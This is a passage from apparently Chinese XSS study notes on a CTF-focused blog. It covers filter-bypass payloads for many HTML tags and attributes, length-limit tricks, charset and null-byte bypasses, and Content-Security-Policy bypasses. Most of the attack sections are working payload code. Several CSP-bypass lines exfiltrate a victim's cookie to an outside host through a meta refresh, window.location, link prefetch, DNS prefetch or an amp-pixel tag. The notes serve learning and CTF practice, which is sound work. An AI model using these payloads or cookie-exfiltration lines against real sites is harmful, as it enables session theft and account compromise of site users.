href=&quot;http://www.baidu.com&quot;&gt;Baidu&lt;/a&gt;</code></pre><p>观察&lt;a标签是否被过滤,href是否被过滤 href里的数据是否被过滤</p><p>如果没有数据被过滤,可以使用javascript伪协议进行测试</p><pre><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;Baidu&lt;/a&gt;</code></pre><p>观察返回情况,是否返回错误,还是JavaScript伪协议中的整个内容都被过滤了还是只过滤了javascript字符,如果是的话,可以尝试大小写转换,编码转换</p><p>继续测试事件触发执行javascript</p><pre><code>&lt;a herf=&quot;baidu.com&quot; onmouseover=alert(&#39;xss&#39;)&gt;Baidu&lt;/a&gt;</code></pre><p>看onmouseover事件是否被过滤,测试一个无效的事件,看过滤规则</p><pre><code>&lt;a herf=&quot;baidu.com&quot; onclimbatree=alert(&#39;xss&#39;)&gt;无效的事件&lt;/a&gt;</code></pre><p>观察是完整的返回了还是和onmouseover一样被过滤了</p><h2 id="测试其他标签"><a href="#测试其他标签" class="headerlink" title="测试其他标签"></a>测试其他标签</h2><h3 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h3><pre><code>&lt;img src=&quot;xxx.xxx.xxx&quot; onerror=alert(&#39;xss&#39;);&gt;&lt;img/src=pig.jpg onerror=alert(&quot;xss&quot;);&gt;&lt;video src=a onerror=prompt(&#39;xss&#39;);&gt;&lt;audio src=x onerror=prompt(&#39;xss&#39;);&gt;</code></pre><h3 id="iframe标签"><a href="#iframe标签" class="headerlink" title="iframe标签"></a>iframe标签</h3><pre><code>&lt;iframe src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></pre><pre><code>&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;&quot;</code></pre><h3 id="embed标签"><a href="#embed标签" class="headerlink" title="embed标签"></a>embed标签</h3><pre><code>&lt;embed/src=//goo.gl/nlXOP&gt;</code></pre><h3 id="action属性"><a href="#action属性" class="headerlink" title="action属性"></a>action属性</h3><p>利用&lt;form,&lt;isindex 等标签中的action属性执行javascript</p><pre><code>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;&lt;isindex action=&quot;javascript:alert(1)&quot; type=image&gt;&lt;isindex action=j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1) type=image&gt;&lt;isindex action=data:text/html, type=image&gt;&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK</code></pre><h3 id="formaction属性"><a href="#formaction属性" class="headerlink" title="formaction属性"></a>formaction属性</h3><pre><code>&lt;isindexformaction=&quot;javascript:alert(1)&quot; type=image&gt;&lt;input type=&quot;image&quot; formaction=JaVaScript:alert(0)&gt;&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</code></pre><h3 id="background属性"><a href="#background属性" class="headerlink" title="background属性"></a>background属性</h3><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // 在Opera 10.5和IE6上有效</code></pre><h3 id="poster属性"><a href="#poster属性" class="headerlink" title="poster属性"></a>poster属性</h3><pre><code>&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Opera 10.5以下有效</code></pre><h3 id="data属性"><a href="#data属性" class="headerlink" title="data属性"></a>data属性</h3><pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;&lt;object/data=//goo.gl/nlX0P?</code></pre><h3 id="code属性"><a href="#code属性" class="headerlink" title="code属性"></a>code属性</h3><pre><code>&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;</code></pre><h3 id="事件触发"><a href="#事件触发" class="headerlink" title="事件触发"></a>事件触发</h3><pre><code>&lt;svg/onload=prompt(1);&gt;&lt;marquee/onstart=confirm(2)&gt;/&lt;body onload=prompt(1);&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;</code></pre><h3 id="最短的测试向量"><a href="#最短的测试向量" class="headerlink" title="最短的测试向量"></a>最短的测试向量</h3><pre><code>&lt;q/oncut=open()&gt;&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效</code></pre><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><pre><code>&lt;marquee&lt;marquee/onstart=confirm(2)&gt;/onstart=confirm(1)&gt;&lt;bodylanguage=vbsonload=alert-1//IE8有效&lt;command onmouseover=&quot;\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x6 6\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B&quot;&gt;Save&lt;/command&gt; //IE8有效</code></pre><h3 id="过滤括号的情况下"><a href="#过滤括号的情况下" class="headerlink" title="过滤括号的情况下"></a>过滤括号的情况下</h3><p>当括号被过滤的时候可以使用throw来绕过</p><pre><code>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&gt;&lt;img src=x onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</code></pre><p>以上两个测试向量在Chrome跟IE在上面会出现一个“uncaught”的错误，可以用以下的向量：</p><pre><code>&lt;body/onload=javascript:window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&gt;</code></pre><h3 id="expression属性"><a href="#expression属性" class="headerlink" title="expression属性"></a>expression属性</h3><pre><code>&lt;img style=&quot;xss:expression(alert(0))&quot;&gt; // IE7以下&lt;div style=&quot;color:rgb(&#39;&#39;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div&gt; // IE7以下&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下</code></pre><h3 id="location属性"><a href="#location属性" class="headerlink" title="location属性"></a>location属性</h3><pre><code>&lt;a onmouseover=location=&#39;javascript:alert(1)&#39;&gt;click&lt;body onfocus=&quot;loaction=&#39;javascript:alert(1)&#39;&quot;&gt;123</code></pre><h3 id="其他的一些payload"><a href="#其他的一些payload" class="headerlink" title="其他的一些payload"></a>其他的一些payload</h3><pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=//goo.gl/nlX0P&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:\u0061lert(1);&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;svg xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;&lt;a&gt;&lt;circle r=100 /&gt;&lt;animate attributeName=&quot;xlink:href&quot; values=&quot;;javascript:alert(1)&quot; begin=&quot;0s&quot; dur=&quot;0.1s&quot; fill=&quot;freeze&quot;/&gt;&lt;svg&gt;&lt;![CDATA[&gt;&lt;imagexlink:href=&quot;]]&gt;&lt;img/src=xx:xonerror=alert(2)//&quot;&gt;&lt;/svg&gt;&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;;JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click</code></pre><h3 id="当-被过滤时"><a href="#当-被过滤时" class="headerlink" title="当= ( ) ; :被过滤时"></a>当= ( ) ; :被过滤时</h3><pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; // 通杀所有浏览器</code></pre><h2 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h2><p>假设存在XSS漏洞的代码为</p><pre><code>&lt;input type=text value=&quot;$var&quot; /&gt;</code></pre><p>下面的payload均为$var的值</p><p>绕过方式1)</p><pre><code>&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;希望达到的输出效果为&lt;input type=text value=&quot;&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&quot; /&gt;</code></pre><p>绕过方式2)</p><p>如果限制输入长度为20</p><p>利用事件(Event)来缩短所需要的字节数</p><pre><code>&quot;onclick=alert(1)//</code></pre><p>加上空格符,刚好够20个字节,实际输出为</p><pre><code>&lt;input type=text value=&quot;&quot; onclick=alert(1)//&quot;/&gt;</code></pre><p>绕过方式3)</p><p>将XSS payload 写在别的地方,再同过简短的代码来加载XSS payload.最常用的就是”location.hash” 而且根据HTTP协议,location.hash的内容不会在HTTP包中发送,所以服务器端的Web日志中并不会记录下location.hash里的内容,更好的隐藏了攻击者的意图.</p><pre><code>&quot; onclick=&quot;eval(location.hash.substr(1))&quot;</code></pre><p>输出后的HTML是</p><pre><code>&lt;input type=&quot;text&quot; value=&quot;&quot; onclick=&quot;eval(location.hash.substr(1))&quot; /&gt;</code></pre><p>因为location.hash的第一个字符是#,所以必须去除第一个字符才行.</p><p>故URL为 <a href="http://www.test.com/test.html#alert(1)" target="_blank" rel="noopener">http://www.test.com/test.html#alert(1)</a>  ,当用户点击文本框时,location.hash里面的代码被执行</p><p>绕过方式4)</p><p>在某些情况下,可以<strong>利用注释符绕过长度限制</strong></p><p>比如有两个文本框,第一个文本框有限制,而第二个限制的并不是很多的情况就可以用注释绕过</p><pre><code>第一个input框中,输入 &quot;&gt;&lt;!-- 在第二个input框中输入 --&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></pre><p>最终的效果</p><pre><code>&lt;input id=1 type type=&quot;text&quot; value=&quot;&quot;&gt;&lt;!--&quot; /&gt; xxxx &lt;input id=2 type=&quot;text&quot; value=&quot;--&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;&quot; /&gt;</code></pre><p>中间的代码全部被注释掉</p><h2 id="XSS过滤并不智能"><a href="#XSS过滤并不智能" class="headerlink" title="XSS过滤并不智能"></a>XSS过滤并不智能</h2><p>如用户输入1+1&lt;3, 如果直接把&lt;过滤了,就有违背用户.因此应该看<strong>具体情况具体对待</strong></p><h2 id="浏览器Bug"><a href="#浏览器Bug" class="headerlink" title="浏览器Bug"></a>浏览器Bug</h2><p>字符集的bug在IE中出现过很多次，第一个就是<strong>UTF-7</strong>，但是这个只在之前的版本中可用，现在讨论一个在现在的浏览器当中可以执行的javascript。</p><pre><code>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=XSS</code></pre><p>这个页面当中我们可控当前页面的字符集，当我们常规的测试时：</p><pre><code>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-8&amp;v=&quot;&gt;&lt;img src=x onerror=prompt(0);&gt;</code></pre><p>返回结果可以看到双引号被编码了：</p><pre><code>&lt;html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/meta&gt;&lt;body&gt;&lt;input type=&quot;text&quot; value=&quot;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=prompt(0);&amp;gt;&quot;&gt;&lt;/input&gt;&lt;/body&gt;&lt;/html&gt; </code></pre><p>设置字符集为<strong>UTF-32</strong>：</p><pre><code>http://xsst.sinaapp.com/utf-32-1.php?charset=utf-32&amp;v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</code></pre><p>上面这个在IE9及以下版本可以执行成功。</p><p>利用0字节绕过：</p><pre><code>&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</code></pre><h2 id="绕过CSP"><a href="#绕过CSP" class="headerlink" title="绕过CSP"></a>绕过CSP</h2><h3 id="CSP介绍"><a href="#CSP介绍" class="headerlink" title="CSP介绍"></a>CSP介绍</h3><p>一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：</p><pre><code>Content-Security-Policy: default-src &#39;self&#39; www.baidu.com; script-src &#39;unsafe-inline&#39;</code></pre><p>其中每一组策略包含一个<strong>策略指令</strong>和一个<strong>内容源</strong>列表</p><h4 id="一、常用的策略指令："><a href="#一、常用的策略指令：" class="headerlink" title="一、常用的策略指令："></a>一、常用的策略指令：</h4><ul><li><h5 id="default-src"><a href="#default-src" class="headerlink" title="default-src"></a>default-src</h5></li></ul><p>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：</p><ul><li><p>child-src</p></li><li><p>connect-src</p></li><li><p>font-src</p></li><li><p>img-src</p></li><li><p>media-src</p></li><li><p>object-src</p></li><li><p>script-src</p></li><li><p>style-src</p></li><li><h5 id="script-src"><a href="#script-src" class="headerlink" title="script-src"></a>script-src</h5></li></ul><p>script-src定义了页面中Javascript的有效来源</p><ul><li><h5 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h5></li></ul><p>style-src定义了页面中CSS样式的有效来源</p><ul><li><h5 id="img-src"><a href="#img-src" class="headerlink" title="img-src"></a>img-src</h5></li></ul><p>img-src定义了页面中图片和图标的有效来源</p><ul><li><h5 id="font-src"><a href="#font-src" class="headerlink" title="font-src"></a>font-src</h5></li></ul><p>font-src定义了字体加载的有效来源</p><ul><li><h5 id="connect-src"><a href="#connect-src" class="headerlink" title="connect-src"></a>connect-src</h5></li></ul><p>connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。</p><ul><li><h5 id="child-src"><a href="#child-src" class="headerlink" title="child-src"></a>child-src</h5></li></ul><p>child-src 指定定义了 web workers 以及嵌套的浏览上下文（如frame和frame）的源。</p><h4 id="二、内容源："><a href="#二、内容源：" class="headerlink" title="二、内容源："></a>二、内容源：</h4><p>内容源有三种：源列表、关键字和数据</p><ul><li><h5 id="源列表"><a href="#源列表" class="headerlink" title="源列表"></a>源列表</h5></li></ul><p>源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, ‘<em>‘)，端口号也可以使用通配符 (同样是 ‘</em>‘) 来表明所有合法端口都是有效来源。主机通过空格分隔。<br> 有效的主机表达式包括：<br> http://*<a href="http://.foo.com" target="_blank" rel="noopener">.foo.com</a> （匹配所有使用 http协议加载 <a href="http://foo.com" target="_blank" rel="noopener">foo.com</a> 任何子域名的尝试。）<br> mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）<br> <a href="https://store.foo.com" target="_blank" rel="noopener">https://store.foo.com</a> （匹配所有使用 https协议访问 <a href="http://store.foo.com" target="_blank" rel="noopener">store.foo.com</a> 的尝试。）<br> 如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。</p><ul><li><h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h5><ul><li><strong>‘none’</strong><br> 代表空集；即不匹配任何 URL。两侧单引号是必须的。</li><li><strong>‘self’</strong><br> 代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</li><li><strong>‘unsafe-inline’</strong><br> 允许使用内联资源，如内联的script元素、javascript: URL、内联的事件处理函数和内联的style元素，两侧单引号是必须的。</li><li><strong>‘unsafe-eval’</strong><br> 允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</li></ul></li></ul><pre class=" language-csharp"><code class="language-csharp">Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> <span class="token keyword">default</span><span class="token operator">-</span>src <span class="token string">'self'</span> trustedscripts<span class="token punctuation">.</span>foo<span class="token punctuation">.</span>com</code></pre><ul><li><h5 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h5><ul><li><strong>data:</strong><br> 允许data: URI作为内容来源。</li><li><strong>mediastream:</strong><br> 允许mediastream: URI作为内容来源。</li></ul></li></ul><pre><code>Content-Security-Policy: default-src &#39;self&#39;; img-src &#39;self&#39; data:; media-src mediastream:</code></pre><h3 id="绕过CSP的几种方式"><a href="#绕过CSP的几种方式" class="headerlink" title="绕过CSP的几种方式"></a>绕过CSP的几种方式</h3><h4 id="一、url跳转"><a href="#一、url跳转" class="headerlink" title="一、url跳转"></a>一、url跳转</h4><p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p><pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</code></pre><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p><pre><code>&lt;script&gt;  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;&lt;/script&gt;</code></pre><h4 id="二、link标签预加载"><a href="#二、link标签预加载" class="headerlink" title="二、link标签预加载"></a>二、link标签预加载</h4><p>CSP对link标签的预加载功能考虑不完善。<br> 在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）</p><pre><code>&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;</code></pre><p>在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><pre><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].xxx.ceye.io&quot;&gt;</code></pre><h4 id="三、利用浏览器补全"><a href="#三、利用浏览器补全" class="headerlink" title="三、利用浏览器补全"></a>三、利用浏览器补全</h4><p>有些网站限制只有某些脚本才能使用，往往会使用script标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p><pre><code>Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</code></pre><p>那么当脚本插入点为如下的情况时</p><pre><code>&lt;p&gt;插入点&lt;/p&gt;&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;</code></pre><p>可以插入</p><pre class=" language-html"><code class="language-html">&lt;script src=//14.rs a="</code></pre><p>这样会拼成一个新的script标签，其中的src可以自由设定</p><pre><code>&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;</code></pre><h4 id="四、代码重用"><a href="#四、代码重用" class="headerlink" title="四、代码重用"></a>四、代码重用</h4><p>Blackhat2017上有篇<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">ppt</a>总结了可以被用来绕过CSP的一些JS库。<br> 例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p><pre><code>&lt;div data-role=popup id=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;&lt;/div&gt;</code></pre><p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取<strong>名字为FLAG的cookie</strong></p><pre><code>&lt;amp-pixel src=&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;&gt;&lt;/amp-pixel&gt;  </code></pre><h4 id="五、iframe"><a href="#五、iframe" class="headerlink" title="五、iframe"></a>五、iframe</h4><p>1.如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p><pre><code>&lt;iframe src=&quot;B&quot;&gt;&lt;/iframe&gt;</code></pre><p>2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a href="http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。" target="_blank" rel="noopener">http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。</a></p><pre><code>&lt;iframe csp=&quot;script-src &#39;unsafe-inline&#39;&quot; src=&quot;http://xxx&quot;&gt;&lt;/iframe&gt;</code></pre><h4 id="六、meta标签"><a href="#六、meta标签" class="headerlink" title="六、meta标签"></a>六、meta标签</h4><p>meta标签有一些不常用的功能有时候有奇效：<br> meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。</p><pre><code>&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</code></pre><p>meta可以设置Cookie（Firefox下），可以结合<strong>self-xss</strong>利用。</p><pre><code>&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;&gt;</code></pre><h3 id="绕过htmlspecialchars-实体编码"><a href="#绕过htmlspecialchars-实体编码" class="headerlink" title="绕过htmlspecialchars()实体编码"></a>绕过htmlspecialchars()实体编码</h3><p>如果输出在在 <code>input</code> 标签中,可以用</p><pre><code>&#39;oninput=alert`1`&#39;oninput=alert`1`&#39;  在input中输入内容时触发事件</code></pre><pre><code>&#39;onchange=alert`1` 发生改变的时候触发该事件&#39;onchange=alert`1`&#39;</code></pre><p>why?因为<strong>htmlspecialchars()默认不过滤单引号</strong></p><p>只有设置了：quotestyle 选项为ENT_QUOTES才会过滤单引号</p><p>在<code>script</code> 中 直接使用<code>alert</code></p><p><a href="https://blog.csdn.net/qq_14989227/article/details/76160172" target="_blank" rel="noopener">https://blog.csdn.net/qq_14989227/article/details/76160172</a></p><p><a href="https://www.cnblogs.com/xishaonian/p/7196604.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/7196604.html</a></p><h1 id="0x07-XSS漏洞挖掘"><a href="#0x07-XSS漏洞挖掘" class="headerlink" title="0x07  XSS漏洞挖掘"></a>0x07  XSS漏洞挖掘</h1><p>挖掘XSS漏洞,大部分都是靠自动化工具和一些手动挖掘,手动挖掘主要是浏览器bug,字符集问题</p><h2 id="1-反射型XSS漏洞挖掘"><a href="#1-反射型XSS漏洞挖掘" class="headerlink" title="1)反射型XSS漏洞挖掘"></a>1)反射型XSS漏洞挖掘</h2><p><img src="https://upload-images.jianshu.io/upload_images/1155692-865aa6e8904a0509.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/918" alt></p><p>反射型XSS攻击者可控的输入点有 path query fragment,而fragment很少会有</p><p>看一个普通的URL</p><p><a href="http://www.foo.com/xss.php?id=1" target="_blank" rel="noopener">http://www.foo.com/xss.php?id=1</a> ,如果攻击者进行XSS测试,将下面的payload分别添加到id=1</p><pre><code>&lt;script&gt;alert(1&lt;/script&gt;&#39;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=@ onerror=alert(1) /&gt;&#39;&quot;&gt;&lt;img/src=@ onerror=alert(1)/&gt;&#39; onmouseover=alert(1) x= &#39;&quot; onmouseover=alert(1) x=&quot;` onmouseover=alert(1) x= `javascript:alert(1)//data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==    &#39;&quot;;alert(1)//&lt;/script&gt;&lt;script&gt;alert(1)}x:expression(alert(1))alert(1)//*/--&gt;&#39;&quot;&lt;/iframe&gt;&lt;/script&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/xmp&gt;&lt;/noscript&gt;&lt;/noframes&gt;&lt;/plaintext&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>​    然后根据请求后的反应来看是否有弹窗或者引起浏览器脚本错误,如果出现这些情况,几乎可以判断是存在XSS漏洞的</p><p>主要是看代码出现的位置</p><h2 id="2-存储型XSS漏洞挖掘"><a href="#2-存储型XSS漏洞挖掘" class="headerlink" title="2)存储型XSS漏洞挖掘"></a>2)存储型XSS漏洞挖掘</h2><p>存储型XSS挖掘与反射型XSS挖掘的内容也大同小异,不过这里一般是表单的提交,然后进入服务端存储中,最终会在某个页面输出.这个过程最难的就是”输出”</p><ul><li>表单提交后跳转到的页面有可能是输出点</li><li>表单所在的页面有可能就是输出点</li><li>表单提交后不见了,然后就要整个网站去找目标输出点</li></ul><h2 id="3-DOM型XSS漏洞挖掘"><a href="#3-DOM型XSS漏洞挖掘" class="headerlink" title="3)DOM型XSS漏洞挖掘"></a>3)DOM型XSS漏洞挖掘</h2><p>输入点(sources)和输出点(sinks)</p><p>挖掘方法又静态方法和动态方法</p><p>静态方法就是使用正则表达式来匹配,动态方法就是利用浏览器的动态.</p><p>这部分内容有点难以理解,我可能也用不到太多.不做过多的总结,需要时Google.</p><h1 id="0x08-XSS在CTF中应用"><a href="#0x08-XSS在CTF中应用" class="headerlink" title="0x08 XSS在CTF中应用"></a>0x08 XSS在CTF中应用</h1><p>XSS在CTF中,一般就是用来窃取cookie/session 一些简单的题目,可能会在cookie中就含有flag</p><p>并且一般的XSS平台都会有相应的payload</p><p>最主要的考察就是XSS绕过,以及bypass CSP,以及 XSS,CSRF,SSRF的综合应用.</p><p>这里放两个WP学习</p><p><a href="http://blog.knownsec.com/2018/04/tctf0ctf2018-xss-writeup/" target="_blank" rel="noopener">TCTF/0CTF2018 XSS Writeup</a></p><p><a href="http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/" target="_blank" rel="noopener">ddctf 两道web题的Writeup (sqli &amp; xss)</a></p><p>等我后面写了XSS的题目,就放一个WP在这里</p><h1 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09  总结"></a>0x09  总结</h1><p>关于XSS漏洞的东西其实还有很多,而且各自奇怪的XSS payload也很多.要做到举一反三,确实,很难…</p><p>所以就多见识一点,多具体应用实操,熟悉了也就差不多懂了</p><p>最重要的还是<strong>在代码层面上,理解漏洞原理</strong>.比如构造闭合,绕过这些,都是代码层面的思路</p><h1 id="0x10-参考资料"><a href="#0x10-参考资料" class="headerlink" title="0x10  参考资料"></a>0x10  参考资料</h1><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/</a></li><li><a href="https://zh.wikipedia.org/wiki/" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/</a></li><li><a href="http://127.0.0.1/DVWA-master/vulnerabilities/xss_s/" target="_blank" rel="noopener">http://127.0.0.1/DVWA-master/vulnerabilities/xss_s/</a> </li><li><a href="https://www.netsparker.com/blog/web-security/dom-based-cross-site-scripting-vulnerability/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/dom-based-cross-site-scripting-vulnerability/</a></li><li><a href="https://www.freebuf.com/sectool/159689.html" target="_blank" rel="noopener">经验分享 | XSS手工利用</a></li><li><a href="https://www.freebuf.com/news/31230.html" target="_blank" rel="noopener">由XSS漏洞引发的僵尸网络DDos攻击风暴</a></li><li><a href="https://thehackerblog.com/more-advanced-xss-denial-of-service-attacks/" target="_blank" rel="noopener">More Advanced XSS Denial of Service Attacks?</a></li><li><a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">前端安全系列(一):如何防止XSS攻击?</a> </li><li><a href="https://blog.csdn.net/jessysong/article/details/77140565" target="_blank" rel="noopener">防御XSS攻击的七条原则</a></li><li><a href="https://paper.seebug.org/533/" target="_blank" rel="noopener">用 javascript 框架绕过 XSS 防御</a></li><li><a href="https://www.leavesongs.com/PENETRATION/xss-collect.html" target="_blank" rel="noopener">那些年我们没能bypass的xss filter[from wooyun]</a></li><li><a href="https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec" target="_blank" rel="noopener">https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec</a></li><li><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html" target="_blank" rel="noopener">Bypass xss过滤的测试方法</a></li><li><a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#XSS%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8" target="_blank" rel="noopener">XSS攻击手段&amp;在CTF中的运用</a></li><li><a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP策略及绕过方法</a></li><li><a href="https://paper.seebug.org/177/" target="_blank" rel="noopener">持久化XSS</a></li><li>&lt;&lt;白帽子讲Web安全&gt;&gt;第三章</li><li>&lt;&lt;Web前端黑客技术揭秘&gt;&gt;</li></ul><h1 id="0x11-最后"><a href="#0x11-最后" class="headerlink" title="0x11 最后"></a>0x11 最后</h1><p>关于这篇XSS笔记,会持续更新,改进,扩展内容</p>]]></content>
      
      
      <categories>
          
          <category> TOP10基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南邮OG-CTF Web Writeup</title>
      <link href="/posts/20200104/"/>
      <url>/posts/20200104/</url>
      
